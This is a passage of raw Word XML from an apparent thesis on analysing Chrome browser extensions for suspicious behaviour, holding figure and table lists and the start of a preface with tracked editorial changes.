          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Figure 11: URL redirection.</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc523071583 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>26</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="46FBB03B" w14:textId="3B10029F" w:rsidR="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TableofFigures"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071584" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="004A5D47">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Figure 12: Access to websites blocked.</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc523071584 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>26</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="40A4A8B1" w14:textId="4BAA7835" w:rsidR="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TableofFigures"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071585" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="004A5D47">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Figure 13: Information from submit requests.</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc523071585 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>27</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="07E85F4D" w14:textId="31A7A7F4" w:rsidR="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TableofFigures"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071586" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="004A5D47">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Figure 14: User’s CPU information.</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc523071586 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>27</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="789CCE02" w14:textId="633D551D" w:rsidR="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TableofFigures"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071587" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="004A5D47">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Figure 15: User’s number of displays.</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc523071587 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>28</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3298160B" w14:textId="4849D9BC" w:rsidR="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TableofFigures"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071588" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="004A5D47">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Figure 16: User’s sessions information.</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc523071588 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>28</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="67364FC3" w14:textId="1AA7CF25" w:rsidR="009E02A4" w:rsidRPr="009E02A4" w:rsidRDefault="00FF5D68" w:rsidP="009E02A4">
      <w:pPr>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:u w:val="dotted"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="009E02A4" w:rsidRPr="009E02A4">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="299EE11B" w14:textId="77777777" w:rsidR="00C4117F" w:rsidRPr="00C4117F" w:rsidRDefault="00C4117F" w:rsidP="00C4117F">
      <w:pPr>
        <w:jc w:val="left"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F2E868D" w14:textId="77777777" w:rsidR="0036629B" w:rsidRPr="00BF4AF3" w:rsidRDefault="0036629B" w:rsidP="0036629B"/>
    <w:p w14:paraId="46EC9C79" w14:textId="77777777" w:rsidR="00331910" w:rsidRPr="00BF4AF3" w:rsidRDefault="003F78BD" w:rsidP="0036629B">
      <w:r w:rsidRPr="00BF4AF3">
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E3BB235" w14:textId="77777777" w:rsidR="00A17701" w:rsidRPr="00724A19" w:rsidRDefault="00724A19" w:rsidP="00A17701">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>LIST OF TABLES</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22E91CC4" w14:textId="57E9FFFD" w:rsidR="00642218" w:rsidRDefault="00CA5C06">
      <w:pPr>
        <w:pStyle w:val="TableofFigures"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>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523071589" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00357ECF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Table 1: All available extension permissions.</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc523071589 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>16</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="64014439" w14:textId="45F26DDB" w:rsidR="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TableofFigures"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071590" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00357ECF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:val="fr-FR"/>
          </w:rPr>
          <w:t>Table 2: “Non-special” extension permissions.</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc523071590 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>18</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1FA32151" w14:textId="3657314F" w:rsidR="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TableofFigures"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071591" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00357ECF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Table 3: Matching every call expression, variable declaration and keyword with a flag.</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc523071591 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>29</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5041D566" w14:textId="506B1C48" w:rsidR="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TableofFigures"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071592" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00357ECF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Table 4: List of rules with their description, flags used and warning message.</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc523071592 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>30</w:t>
        </w:r>
        <w:r w:rsidR="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="354AC110" w14:textId="23F902B2" w:rsidR="00687604" w:rsidRPr="0036629B" w:rsidRDefault="00CA5C06" w:rsidP="0036629B">
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00331910" w:rsidRPr="009E02A4">
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FDD5802" w14:textId="77777777" w:rsidR="008D36E5" w:rsidRDefault="00724A19" w:rsidP="000F0643">
      <w:pPr>
        <w:pStyle w:val="PEGGY"/>
      </w:pPr>
      <w:bookmarkStart w:id="26" w:name="_Toc460936756"/>
      <w:bookmarkStart w:id="27" w:name="_Toc523071490"/>
      <w:bookmarkEnd w:id="25"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>PREFACE</w:t>
      </w:r>
      <w:bookmarkEnd w:id="26"/>
      <w:bookmarkEnd w:id="27"/>
    </w:p>
    <w:p w14:paraId="39860C5C" w14:textId="77777777" w:rsidR="000F0643" w:rsidRPr="001D5415" w:rsidRDefault="000F0643" w:rsidP="000F0643">
      <w:pPr>
        <w:pStyle w:val="PEGGY"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6FDC9954" w14:textId="2210F501" w:rsidR="00A2258E" w:rsidRDefault="00D66D8C" w:rsidP="00C631FC">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>This thesis</w:t>
      </w:r>
      <w:r w:rsidR="009D502B">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>took</w:t>
      </w:r>
      <w:r w:rsidR="009D502B">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">place in Athens </w:t>
      </w:r>
      <w:r w:rsidR="009D502B">
        <w:t>of Greece between</w:t>
      </w:r>
      <w:r w:rsidR="006E60B1">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000F0643">
        <w:t>December</w:t>
      </w:r>
      <w:r w:rsidR="006E60B1">
        <w:t xml:space="preserve"> 201</w:t>
      </w:r>
      <w:r w:rsidR="000F0643">
        <w:t>7</w:t>
      </w:r>
      <w:r w:rsidR="006E60B1">
        <w:t xml:space="preserve"> and June 2018.</w:t>
      </w:r>
      <w:r w:rsidR="009D502B">
        <w:t xml:space="preserve"> It is consisted </w:t>
      </w:r>
      <w:ins w:id="28" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:33:00Z">
        <w:r w:rsidR="00092514">
          <w:t>of</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="29" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:33:00Z">
        <w:r w:rsidR="009D502B" w:rsidDel="00092514">
          <w:delText>by</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="009D502B">
        <w:t xml:space="preserve"> three parts, </w:t>
      </w:r>
      <w:ins w:id="30" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:34:00Z">
        <w:r w:rsidR="00535150">
          <w:t>research on</w:t>
        </w:r>
        <w:r w:rsidR="00CC0017">
          <w:t xml:space="preserve"> related work</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="31" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:33:00Z">
        <w:r w:rsidR="009D502B" w:rsidDel="007A257E">
          <w:delText>R</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="32" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:34:00Z">
        <w:r w:rsidR="009D502B" w:rsidDel="00CC0017">
          <w:delText>eading</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="009D502B">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:ins w:id="33" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:33:00Z">
        <w:r w:rsidR="007A257E">
          <w:t>i</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="34" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:33:00Z">
        <w:r w:rsidR="009D502B" w:rsidDel="007A257E">
          <w:delText>I</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="009D502B">
        <w:t xml:space="preserve">mplementation and </w:t>
      </w:r>
      <w:ins w:id="35" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:33:00Z">
        <w:r w:rsidR="007A257E">
          <w:t>w</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="36" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:33:00Z">
        <w:r w:rsidR="009D502B" w:rsidDel="007A257E">
          <w:delText>W</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="009D502B">
        <w:t>riting. For the first part</w:t>
      </w:r>
      <w:r w:rsidR="00A1122A">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:ins w:id="37" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:33:00Z">
        <w:r w:rsidR="00CC0017">
          <w:t xml:space="preserve">we </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="38" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:33:00Z">
        <w:r w:rsidR="00A1122A" w:rsidDel="00CC0017">
          <w:delText>I</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="39" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:34:00Z">
        <w:r w:rsidR="00A1122A" w:rsidDel="001B578A">
          <w:delText xml:space="preserve"> read some papers in order to </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00A1122A">
        <w:t>familiarize</w:t>
      </w:r>
      <w:ins w:id="40" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:34:00Z">
        <w:r w:rsidR="001B578A">
          <w:t>d</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00A1122A">
        <w:t xml:space="preserve"> with related work </w:t>
      </w:r>
      <w:ins w:id="41" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:34:00Z">
        <w:r w:rsidR="00531753">
          <w:t xml:space="preserve">on the area </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00A1122A">
        <w:t>and gather</w:t>
      </w:r>
      <w:ins w:id="42" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:34:00Z">
        <w:r w:rsidR="00FB0E24">
          <w:t>ed</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00A1122A">
        <w:t xml:space="preserve"> ideas</w:t>
      </w:r>
      <w:del w:id="43" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:34:00Z">
        <w:r w:rsidR="00A1122A" w:rsidDel="00655DCB">
          <w:delText xml:space="preserve"> for the subject</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00A1122A">
        <w:t xml:space="preserve">. The implementation phase </w:t>
      </w:r>
      <w:r w:rsidR="00C65962">
        <w:t xml:space="preserve">was about creating the extension and the application that would perform the analysis. </w:t>
      </w:r>
      <w:ins w:id="44" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:34:00Z">
        <w:r w:rsidR="0075527C">
          <w:t>We</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="45" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:34:00Z">
        <w:r w:rsidR="00C65962" w:rsidDel="0075527C">
          <w:delText>I</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00C65962">
        <w:t xml:space="preserve"> started creating the part that downloads the extension files (.crx file) the user has chosen and extract them.</w:t>
      </w:r>
      <w:r w:rsidR="003D03DA">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C65962">
        <w:t xml:space="preserve">Then, </w:t>
      </w:r>
      <w:ins w:id="46" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:34:00Z">
        <w:r w:rsidR="0050287A">
          <w:t>we</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="47" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:34:00Z">
        <w:r w:rsidR="00C65962" w:rsidDel="0050287A">
          <w:delText>I</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00C65962">
        <w:t xml:space="preserve"> created two parsers, one for HTML files and the other for </w:t>
      </w:r>
      <w:r w:rsidR="006E0B21">
        <w:t>JavaScript</w:t>
      </w:r>
      <w:r w:rsidR="003D03DA">
        <w:t>, and</w:t>
      </w:r>
      <w:del w:id="48" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:35:00Z">
        <w:r w:rsidR="003D03DA" w:rsidDel="00962664">
          <w:delText xml:space="preserve"> I</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="003D03DA">
        <w:t xml:space="preserve"> parsed each file of the extension. </w:t>
      </w:r>
